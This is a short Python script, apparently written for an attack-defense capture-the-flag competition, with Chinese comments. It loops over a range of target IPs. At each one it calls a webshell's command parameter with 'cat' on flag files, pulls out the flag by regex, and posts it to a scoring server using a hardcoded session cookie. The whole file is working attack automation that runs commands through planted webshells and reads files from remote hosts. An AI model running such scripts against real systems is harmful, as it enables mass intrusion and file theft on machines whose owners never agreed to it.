import requests
import re
import time

# 请求
def request(url):
    print(url)
    resp = requests.get(url)
    return resp.text
# 获取flag
def getFlag(html):
    flag = re.search("flag{[\W\w\D\d\s\S]*}",html).group()
    return flag
# 提交flag
def submib_Flag(ip,flag):
    url = "http://172.15.91.101/lms/portal/sp/hz_flag.php"  # flag提交地址
    data = {"melee_ip":"","melee_flag":""}
    data['melee_ip'] = ip # 靶机ip
    data['melee_flag'] = flag # 该靶机上flag
    print(flag)
    header = {"cookie":"SSCSum=1; lms_login_name=cqipc1; zlms-sid=ruf8d3qk28iqtooa52fbsmke01; webcs_test_cookie=lms_cookie_checker"}
    resp = requests.post(url,data=data,headers=header)
    #print(len(resp.text))
    # 返回页面提示
    if "您已提交过当前IP和FLAG，请确认！" in resp.text:
        print("\033[1;33m已提交过\033[0m")
    elif  "您提交得FLAG错误，请继续努力" in resp.text:
        print("\033[1;31m提交错误\033[0m")
    elif "恭喜您答对了" in resp.text:
        print("\033[1;32m提交成功\033[0m")
    elif len(resp.text) == 1744:
        print("\033[1;31;30m未登录\033[0m")
        exit()
    # 暂停10s
    time.sleep(10)


def main():
        for ip in range(101,109):
            try:
                ip = "172.20."+str(ip)+".101"
                print("This:"+ip)
                # 第一个flag
                url_payload1 = "http://"+ip+"/W3bShell/webshell.php?a=cat /flag.txt"
                submib_Flag(ip,getFlag(request(url_payload1)))

                # 第二个flag
                url_payload2 = "http://"+ip+"/W3bShell/webshell.php?a=cat /var/www/admin/flag2.txt"
                submib_Flag(ip,getFlag(request(url_payload2)))
            except:
                pass

if __name__ == '__main__':
    main()
